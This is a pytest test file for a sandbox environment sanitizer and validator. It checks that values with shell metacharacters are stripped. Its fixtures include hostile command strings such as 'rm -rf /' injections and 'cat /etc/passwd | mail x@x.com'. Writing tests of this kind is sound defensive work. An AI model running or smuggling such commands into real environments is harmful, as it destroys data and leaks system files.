"""Tests for workers.sandbox.env_sanitizer — sanitize_env() and validate_env()."""

from __future__ import annotations

import pytest

from workers.sandbox.env_sanitizer import (
    sanitize_env,
    validate_env,
)


class TestSanitizeEnv:
    """Coverage for :func:`sanitize_env`."""

    def test_passthrough_empty(self):
        assert sanitize_env({}) == {}

    def test_keeps_safe_values(self):
        raw = {"PATH": "/usr/bin", "HOME": "/root"}
        assert sanitize_env(raw) == raw

    def test_strips_dangerous_semicolon(self):
        raw = {"PATH": "/usr/bin", "INJECT": "echo; rm -rf /"}
        result = sanitize_env(raw)
        assert "INJECT" not in result
        assert "PATH" in result

    def test_strips_dangerous_backtick(self):
        raw = {"CMD": "echo `whoami`"}
        assert sanitize_env(raw) == {}

    def test_strips_dollar_brace(self):
        raw = {"VAR": "${SECRET}"}
        assert sanitize_env(raw) == {}

    def test_strips_pipe(self):
        raw = {"X": "cat /etc/passwd | mail x@x.com"}
        assert sanitize_env(raw) == {}

    def test_strips_newline(self):
        raw = {"X": "safe\nrm -rf /"}
        assert sanitize_env(raw) == {}

    def test_strips_null_byte(self):
        raw = {"X": "safe\x00exploit"}
        assert sanitize_env(raw) == {}

    def test_strips_ampersand(self):
        raw = {"X": "command &"}
        assert sanitize_env(raw) == {}

    def test_strips_hash(self):
        raw = {"X": "val#comment"}
        assert sanitize_env(raw) == {}

    def test_allowlist_keeps_only_allowed(self):
        raw = {"PATH": "/bin", "SECRET": "s3kr3t", "DEBUG": "1"}
        result = sanitize_env(raw, allowlist={"PATH", "DEBUG"})
        assert result == {"PATH": "/bin", "DEBUG": "1"}

    def test_allowlist_empty(self):
        result = sanitize_env({"A": "1", "B": "2"}, allowlist=set())
        assert result == {}

    def test_allowlist_still_strips_dangerous(self):
        raw = {"OK": "safe", "DANGER": "rm -rf /; echo"}
        result = sanitize_env(raw, allowlist={"OK", "DANGER"})
        assert result == {"OK": "safe"}

    def test_strip_dangerous_false(self):
        raw = {"X": "echo; rm -rf /"}
        assert sanitize_env(raw, strip_dangerous=False) == raw

    def test_max_value_length(self):
        raw = {"SHORT": "ok", "LONG": "x" * 5000}
        result = sanitize_env(raw, max_value_length=100)
        assert result == {"SHORT": "ok"}
        assert "LONG" not in result

    def test_none_allowlist_allows_all(self):
        raw = {"A": "1", "B": "2"}
        assert sanitize_env(raw, allowlist=None) == raw

    def test_does_not_mutate_input(self):
        raw = {"A": "1", "B": "2"}
        original = dict(raw)
        sanitize_env(raw, allowlist={"A"})
        assert raw == original


class TestValidateEnv:
    """Coverage for :func:`validate_env`."""

    def test_empty_no_rules(self):
        assert validate_env({}) == []

    def test_no_rules_with_values(self):
        assert validate_env({"A": "1"}) == []

    def test_rules_required_ok(self):
        env = {"REQUIRED_KEY": "val", "OTHER": "x"}
        assert validate_env(env, rules={"required": ["REQUIRED_KEY"]}) == []

    def test_rules_required_missing(self):
        env = {"OTHER": "x"}
        errors = validate_env(env, rules={"required": ["REQUIRED_KEY"]})
        assert len(errors) == 1
        assert "REQUIRED_KEY" in errors[0]
        assert "missing" in errors[0]

    def test_rules_required_multiple_missing(self):
        env = {}
        errors = validate_env(env, rules={"required": ["A", "B", "C"]})
        assert len(errors) == 3

    def test_max_length_ok(self):
        env = {"SHORT": "abc"}
        errors = validate_env(env, rules={"max_length": 10})
        assert errors == []

    def test_max_length_violation(self):
        env = {"LONG": "a" * 100}
        errors = validate_env(env, rules={"max_length": 10})
        assert len(errors) == 1
        assert "LONG" in errors[0]
        assert "100 > 10" in errors[0]

    def test_pattern_match(self):
        env = {"VERSION": "v1.2.3"}
        errors = validate_env(env, rules={"patterns": {"VERSION": r"v\d+\.\d+\.\d+"}})
        assert errors == []

    def test_pattern_no_match(self):
        env = {"VERSION": "abc"}
        errors = validate_env(env, rules={"patterns": {"VERSION": r"v\d+\.\d+\.\d+"}})
        assert len(errors) == 1
        assert "VERSION" in errors[0]

    def test_pattern_missing_key(self):
        """Missing keys should not trigger pattern errors."""
        errors = validate_env(
            {"OTHER": "x"},
            rules={"patterns": {"VERSION": r"\d+"}},
        )
        assert errors == []

    def test_allowed_values_ok(self):
        env = {"MODE": "production"}
        errors = validate_env(
            env,
            rules={"allowed_values": {"MODE": ["development", "production", "staging"]}},
        )
        assert errors == []

    def test_allowed_values_violation(self):
        env = {"MODE": "invalid"}
        errors = validate_env(
            env,
            rules={"allowed_values": {"MODE": ["development", "production"]}},
        )
        assert len(errors) == 1
        assert "MODE" in errors[0]
        assert "invalid" in errors[0]

    def test_allowed_values_missing_key(self):
        errors = validate_env(
            {"OTHER": "x"},
            rules={"allowed_values": {"MODE": ["dev", "prod"]}},
        )
        assert errors == []

    def test_combined_rules(self):
        env = {"APP_ENV": "staging", "DB_URL": "postgres://localhost/db"}
        rules = {
            "required": ["APP_ENV"],
            "max_length": 100,
            "patterns": {"DB_URL": r"postgres://"},
            "allowed_values": {"APP_ENV": ["dev", "staging", "prod"]},
        }
        assert validate_env(env, rules=rules) == []

    def test_combined_rules_fail(self):
        env = {"DB_URL": "sqlite:///tmp/db"}
        rules = {
            "required": ["APP_ENV"],
            "max_length": 5,
            "patterns": {"DB_URL": r"postgres://"},
            "allowed_values": {"APP_ENV": ["dev", "staging", "prod"]},
        }
        errors = validate_env(env, rules=rules)
        # Should fail: APP_ENV missing, DB_URL too long, DB_URL pattern fail
        assert len(errors) >= 3

    def test_non_string_key(self):
        env = {123: "value"}  # type: ignore[dict-item]
        errors = validate_env(env)  # type: ignore[arg-type]
        assert len(errors) == 1

    def test_non_string_value(self):
        env = {"KEY": 42}  # type: ignore[dict-item]
        errors = validate_env(env)  # type: ignore[arg-type]
        assert len(errors) == 1

    def test_rules_none(self):
        assert validate_env({"A": "1"}, rules=None) == []

    def test_rules_with_empty_required(self):
        assert validate_env({"A": "1"}, rules={"required": []}) == []


class TestSanitizeThenValidate:
    """Integration: sanitize output should pass basic validation."""

    def test_sanitized_env_is_valid(self):
        raw = {
            "PATH": "/usr/bin:/bin",
            "HOME": "/root",
            "EVIL": "rm -rf /; echo pwned",
        }
        cleaned = sanitize_env(raw)
        errors = validate_env(cleaned)
        assert errors == []
        assert "EVIL" not in cleaned
